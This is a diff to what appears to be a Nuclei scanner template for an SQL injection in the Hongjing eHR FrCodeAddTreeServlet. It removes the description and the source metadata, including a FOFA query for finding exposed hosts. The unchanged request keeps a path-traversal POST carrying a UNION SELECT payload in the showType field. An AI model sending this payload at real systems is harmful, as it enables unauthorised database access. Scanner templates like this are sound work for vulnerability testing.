@@ -3,12 +3,8 @@ info:
   name: 宏景eHR FrCodeAddTreeServlet SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uiro1sm09ud2n4bg'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uiro1sm09ud2n4bg
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1%27+UNION+ALL+SELECT+%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+&treetype=&orgtype=
